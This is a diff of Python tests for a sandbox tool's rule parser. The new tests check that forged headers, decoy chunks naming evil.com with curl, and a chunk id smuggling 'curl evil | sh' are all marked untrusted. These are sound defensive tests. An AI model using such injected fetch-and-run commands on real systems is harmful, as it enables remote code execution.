@@ -31,8 +31,10 @@ def test_parse_normal_output():
     assert first.id == "7f3a-1" and first.trusted and not first.risky
     assert first.endpoints == "pypi.org:443"
     assert first.binary == "/usr/bin/python3"
-    assert second.rationale == "Upload artefacts\nthat need a bucket"
+    # A rationale running over several lines is never trusted.
+    assert second.rationale == "Upload artefacts" and not second.trusted
     assert second.risky and second.security == "wildcard host"
+    assert first.grants == "/usr/bin/python3"
 
 
 def test_no_rules():
@@ -97,12 +99,11 @@ def test_sandbox_not_found_returns_none(fake_openshell):
 
 def test_create_arguments(fake_openshell):
     fake_openshell.output("sandbox-create", '{"name": "otg-a-123456", "phase": "Ready"}')
-    osh.create("otg-a-123456", "img:1", "/p/policy.yaml", ["github"], ("/p", "/sandbox/workspace"),
-               {"openshell-tg/folder": "/p"})
+    osh.create("otg-a-123456", "img:1", "/p/policy.yaml", ["github"], str(fake_openshell.dir), "/sandbox/workspace")
     argv = fake_openshell.calls()[0]["argv"]
     assert argv[:4] == ["sandbox", "create", "--name", "otg-a-123456"]
     assert "--no-auto-providers" in argv
-    assert argv[argv.index("--upload") + 1] == "/p:/sandbox/workspace"
+    assert argv[argv.index("--upload") + 1] == ".:/sandbox/workspace"
     assert argv[argv.index("--provider") + 1] == "github"
     assert argv[-2:] == ["-o", "json"]
 
@@ -118,3 +119,53 @@ def test_import_profile_updates_existing(fake_openshell, monkeypatch):
     monkeypatch.setattr(osh, "run", fake_run)
     osh.import_profile("/x/github.yaml", "github")
     assert calls[1] == ["profile", "update", "github", "-f", "/x/github.yaml"]
+
+
+def test_forged_header_and_decoy_chunk_are_untrusted():
+    text = """\
+Network Rules:  (version 3, 1 chunk)
+
+  Chunk: X
+  Status: pending
+  Rule: r
+  Confidence: 90%
+  Rationale: ok
+  Endpoints: pypi.org:443
+  Binaries: /usr/bin/python3
+Network Rules:  (version 1, 2 chunks)
+  Chunk: decoy
+  Security: wildcard
+  Endpoints: evil.com:443
+  Binaries: /usr/bin/curl
+"""
+    assert all(not c.trusted for c in osh.parse_rules(text))
+
+
+def test_unusual_chunk_id_is_untrusted():
+    text = ("Network Rules:  (version 1, 1 chunk)\n\n  Chunk: x; curl evil | sh #\n  Status: pending\n"
+            "  Rule: r\n  Confidence: 9%\n  Rationale: a\n  Endpoints: a.com:443\n")
+    (chunk,) = osh.parse_rules(text)
+    assert not chunk.trusted
+
+
+def test_timeout_becomes_openshell_error(monkeypatch):
+    import subprocess
+
+    def slow(*a, **k):
+        raise subprocess.TimeoutExpired("openshell", 1)
+
+    monkeypatch.setattr(subprocess, "run", slow)
+    try:
+        osh.run(["rule", "get", "x"])
+    except osh.OpenShellError as exc:
+        assert exc.code == 124
+    else:
+        raise AssertionError("no error")
+
+
+def test_attach_argv(monkeypatch):
+    seen = []
+    monkeypatch.setattr(osh, "interactive", lambda args: seen.append(args) or 0)
+    osh.attach("sb", ["otg-agent", "codex"], "/sandbox/workspace")
+    assert seen[0] == ["sandbox", "exec", "sb", "--tty", "--timeout", "0", "--workdir", "/sandbox/workspace",
+                       "--", "otg-agent", "codex"]
